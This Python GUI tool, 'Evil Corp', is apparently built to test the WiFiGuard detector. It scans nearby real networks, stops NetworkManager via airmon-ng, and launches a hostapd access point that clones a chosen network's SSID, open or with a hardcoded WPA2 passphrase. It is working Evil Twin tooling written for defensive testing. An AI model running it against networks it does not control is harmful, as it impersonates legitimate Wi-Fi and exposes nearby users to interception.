"""Evil Corp: a controlled Evil Twin attack simulator for WiFiGuard testing.

Runs on a Kali Linux Live USB. Lets you pick a real nearby network from a
Tkinter GUI, choose a test scenario, and launch/stop a cloned AP with
hostapd — instead of typing hostapd invocations by hand on the command
line.

Scenarios:
  1. Evil Twin            - open, BSSID + encryption mismatch (the classic
                             attack: same SSID, no password, different
                             hardware).
  2. False Positive Check - same SSID, matching WPA2, same channel. Used to
                             confirm WiFiGuard does NOT flag a network that
                             merely has two legitimate access points with
                             the same SSID (e.g. mesh/AP roaming).
  3. Channel Variance Only - same SSID, matching WPA2, different channel.
                             Isolates the channel-mismatch detection rule
                             on its own, without an encryption downgrade.

Requires: a Kali Linux environment with hostapd and NetworkManager, and a
wireless interface capable of AP (master) mode.
"""

import os
import re
import subprocess
import threading
import tkinter as tk
from tkinter import messagebox, ttk

def _detect_interface() -> str:
    """Pick the wireless interface to use.

    Interface names vary by machine/driver (wlan0, wlo1, wlp3s0,
    wlx<mac>, ...), so don't hardcode one. EVIL_CORP_INTERFACE overrides
    everything if set; otherwise look for any interface the kernel
    reports as wireless (has a /sys/class/net/<iface>/wireless dir, which
    needs no extra tools like `iw` to check), and fall back to the old
    "wlan0" default if nothing is found (e.g. machine checked before the
    adapter is plugged in).
    """
    env_iface = os.environ.get("EVIL_CORP_INTERFACE")
    if env_iface:
        return env_iface
    sys_net = "/sys/class/net"
    try:
        candidates = sorted(
            name for name in os.listdir(sys_net)
            if os.path.isdir(os.path.join(sys_net, name, "wireless"))
        )
    except FileNotFoundError:
        candidates = []
    return candidates[0] if candidates else "wlan0"


INTERFACE = _detect_interface()
CONF_PATH = os.path.expanduser("~/wifiguard-tests/generated_attack.conf")

SCENARIOS = {
    "evil_twin": {
        "label": "Test 1: Evil Twin (Open, BSSID+Encryption mismatch)",
        "security": "open",
        "channel_mode": "same",
    },
    "false_positive": {
        "label": "Test 2: False Positive Check (Matching WPA2, same channel)",
        "security": "wpa2",
        "channel_mode": "same",
    },
    "channel_variance": {
        "label": "Test 3: Channel Variance Only (Matching WPA2, different channel)",
        "security": "wpa2",
        "channel_mode": "different",
    },
}

WPA2_PASSPHRASE = "testpassword123"


class EvilCorpApp:
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("Evil Corp")
        self.root.geometry("640x520")
        self.root.resizable(False, False)

        self.networks_raw: list[dict] = []
        self.attack_process: subprocess.Popen | None = None
        self.attack_thread: threading.Thread | None = None

        self._build_ui()
        self.log(f"Using wireless interface: {INTERFACE}")
        self.refresh_networks()

    # --- UI -----------------------------------------------------------

    def _build_ui(self) -> None:
        pad = {"padx": 10, "pady": 6}

        top = ttk.Frame(self.root)
        top.pack(fill="x", **pad)
        ttk.Button(top, text="Prepare Attack Mode", command=self.prepare_attack_mode).pack(
            side="left", padx=(0, 8)
        )
        ttk.Button(top, text="Restore Networking", command=self.restore_networking).pack(
            side="left", padx=(0, 8)
        )
        ttk.Button(top, text="Refresh Networks", command=self.refresh_networks).pack(side="left")

        net_frame = ttk.LabelFrame(self.root, text="Target network")
        net_frame.pack(fill="x", **pad)
        self.network_combo = ttk.Combobox(net_frame, state="readonly", width=70)
        self.network_combo.pack(fill="x", padx=8, pady=8)
        self.network_combo.bind("<<ComboboxSelected>>", self.on_network_select)

        detail_frame = ttk.Frame(net_frame)
        detail_frame.pack(fill="x", padx=8, pady=(0, 8))
        self.detected_channel_var = tk.StringVar(value="-")
        self.detected_security_var = tk.StringVar(value="-")
        ttk.Label(detail_frame, text="Detected Real Channel:").grid(row=0, column=0, sticky="w")
        ttk.Label(detail_frame, textvariable=self.detected_channel_var).grid(row=0, column=1, sticky="w")
        ttk.Label(detail_frame, text="Detected Real Security:").grid(row=1, column=0, sticky="w")
        ttk.Label(detail_frame, textvariable=self.detected_security_var).grid(row=1, column=1, sticky="w")

        scenario_frame = ttk.LabelFrame(self.root, text="Attack scenario")
        scenario_frame.pack(fill="x", **pad)
        self.scenario_combo = ttk.Combobox(
            scenario_frame,
            state="readonly",
            width=70,
            values=[s["label"] for s in SCENARIOS.values()],
        )
        self.scenario_combo.current(0)
        self.scenario_combo.pack(fill="x", padx=8, pady=8)
        self.scenario_combo.bind("<<ComboboxSelected>>", self.on_scenario_change)

        scenario_detail = ttk.Frame(scenario_frame)
        scenario_detail.pack(fill="x", padx=8, pady=(0, 8))
        self.scenario_security_var = tk.StringVar()
        self.scenario_channel_var = tk.StringVar()
        ttk.Label(scenario_detail, text="Broadcast Security:").grid(row=0, column=0, sticky="w")
        ttk.Label(scenario_detail, textvariable=self.scenario_security_var).grid(row=0, column=1, sticky="w")
        ttk.Label(scenario_detail, text="Broadcast Channel:").grid(row=1, column=0, sticky="w")
        ttk.Label(scenario_detail, textvariable=self.scenario_channel_var).grid(row=1, column=1, sticky="w")
        self.on_scenario_change()

        action_frame = ttk.Frame(self.root)
        action_frame.pack(fill="x", **pad)
        self.launch_btn = ttk.Button(action_frame, text="Launch Attack", command=self.launch_attack)
        self.launch_btn.pack(side="left", padx=(0, 8))
        self.stop_btn = ttk.Button(
            action_frame, text="Stop Attack", command=self.stop_attack, state="disabled"
        )
        self.stop_btn.pack(side="left")

        log_frame = ttk.LabelFrame(self.root, text="Status")
        log_frame.pack(fill="both", expand=True, **pad)
        self.log_text = tk.Text(log_frame, height=12, state="disabled", wrap="word")
        self.log_text.pack(fill="both", expand=True, padx=8, pady=8)

    def log(self, message: str) -> None:
        self.log_text.configure(state="normal")
        self.log_text.insert("end", message + "\n")
        self.log_text.see("end")
        self.log_text.configure(state="disabled")

    # --- network / airmon control --------------------------------------

    def prepare_attack_mode(self) -> None:
        """Free the wireless interface from NetworkManager/wpa_supplicant so
        hostapd can put it into AP (master) mode. This also stops this
        machine's own Wi-Fi scanning until Restore Networking is run."""
        self.log("Preparing attack mode: killing NetworkManager/wpa_supplicant on the interface...")
        try:
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
            self.log("Interface freed. NetworkManager is stopped until you Restore Networking.")
        except subprocess.CalledProcessError as e:
            self.log(f"Failed to prepare attack mode: {e}")

    def restore_networking(self) -> None:
        self.log("Restoring NetworkManager...")
        try:
            subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], check=True)
            self.log("NetworkManager restored. Wi-Fi scanning available again.")
        except subprocess.CalledProcessError as e:
            self.log(f"Failed to restore networking: {e}")

    def refresh_networks(self) -> None:
        self.log("Scanning for nearby networks...")
        try:
            result = subprocess.run(
                [
                    "nmcli", "-t", "-f", "SSID,BSSID,CHAN,SECURITY",
                    "device", "wifi", "list", "--rescan", "yes",
                ],
                capture_output=True, text=True, encoding="utf-8", errors="ignore",
            )
        except FileNotFoundError:
            self.log("nmcli not found. Is NetworkManager installed?")
            return

        self.networks_raw = []
        display_values = []
        for line in result.stdout.splitlines():
            fields = _split_terse_line(line.strip())
            if len(fields) < 4:
                continue
            ssid, bssid, chan, security = fields[:4]
            if not ssid or not bssid:
                continue
            self.networks_raw.append(
                {"ssid": ssid, "bssid": bssid.lower(), "channel": chan, "security": security or "Open"}
            )
            display_values.append(f"{ssid}  [{bssid.lower()}]  ch{chan}  {security or 'Open'}")

        self.network_combo["values"] = display_values
        if display_values:
            self.network_combo.current(0)
            self.on_network_select()
        self.log(f"Found {len(display_values)} networks.")

    def on_network_select(self, event=None) -> None:
        idx = self.network_combo.current()
        if idx < 0 or idx >= len(self.networks_raw):
            return
        net = self.networks_raw[idx]
        self.detected_channel_var.set(net["channel"])
        self.detected_security_var.set(net["security"])
        self.apply_scenario_channel()

    # --- scenario config -------------------------------------------------

    def on_scenario_change(self, event=None) -> None:
        key = self._current_scenario_key()
        scenario = SCENARIOS[key]
        self.scenario_security_var.set(scenario["security"].upper())
        self.apply_scenario_channel()

    def apply_scenario_channel(self) -> None:
        key = self._current_scenario_key()
        scenario = SCENARIOS[key]
        real_channel = self.detected_channel_var.get()
        if scenario["channel_mode"] == "same" or not real_channel.isdigit():
            self.scenario_channel_var.set(real_channel)
        else:
            # pick a different, valid 2.4GHz channel than the real one
            real = int(real_channel)
            alt = 1 if real != 1 else 6
            self.scenario_channel_var.set(str(alt))

    def _current_scenario_key(self) -> str:
        idx = self.scenario_combo.current()
        return list(SCENARIOS.keys())[idx] if idx >= 0 else "evil_twin"

    # --- attack lifecycle -------------------------------------------------

    def launch_attack(self) -> None:
        idx = self.network_combo.current()
        if idx < 0 or idx >= len(self.networks_raw):
            messagebox.showwarning("Evil Corp", "Select a target network first.")
            return

        net = self.networks_raw[idx]
        key = self._current_scenario_key()
        scenario = SCENARIOS[key]
        channel = self.scenario_channel_var.get()

        os.makedirs(os.path.dirname(CONF_PATH), exist_ok=True)
        lines = [
            f"interface={INTERFACE}",
            f"driver=nl80211",
            f"ssid={net['ssid']}",
            f"channel={channel}",
            "hw_mode=g",
        ]
        if scenario["security"] == "wpa2":
            lines += [
                "wpa=2",
                f"wpa_passphrase={WPA2_PASSPHRASE}",
                "wpa_key_mgmt=WPA-PSK",
                "rsn_pairwise=CCMP",
            ]
        open(CONF_PATH, "w").write("\n".join(lines) + "\n")

        self.log(f"--- Launching attack ---")
        self.log(f"Target SSID: {net['ssid']}")
        self.log(f"Security: {scenario['security'].upper()}")
        self.log(f"Channel: {channel}")
        self.log(f"Config written to {CONF_PATH}")

        self.launch_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.attack_thread = threading.Thread(target=self.run_hostapd, daemon=True)
        self.attack_thread.start()

    def run_hostapd(self) -> None:
        try:
            self.attack_process = subprocess.Popen(
                ["sudo", "hostapd", CONF_PATH],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
            for line in self.attack_process.stdout:
                self.root.after(0, self.log, line.rstrip())
        except FileNotFoundError:
            self.root.after(0, self.log, "hostapd not found. Is it installed?")
        finally:
            self.root.after(0, self._on_attack_stopped)

    def stop_attack(self) -> None:
        if self.attack_process and self.attack_process.poll() is None:
            self.attack_process.terminate()
            self.log("Attack stopped.")
        self._on_attack_stopped()

    def _on_attack_stopped(self) -> None:
        self.launch_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")


def _split_terse_line(line: str) -> list[str]:
    """Split an `nmcli -t` line on unescaped colons (BSSIDs contain colons
    that nmcli escapes with a backslash)."""
    fields: list[str] = []
    current = []
    i = 0
    while i < len(line):
        ch = line[i]
        if ch == "\\" and i + 1 < len(line):
            current.append(line[i + 1])
            i += 2
            continue
        if ch == ":":
            fields.append("".join(current))
            current = []
            i += 1
            continue
        current.append(ch)
        i += 1
    fields.append("".join(current))
    return fields


if __name__ == "__main__":
    root = tk.Tk()
    EvilCorpApp(root)
    root.mainloop()
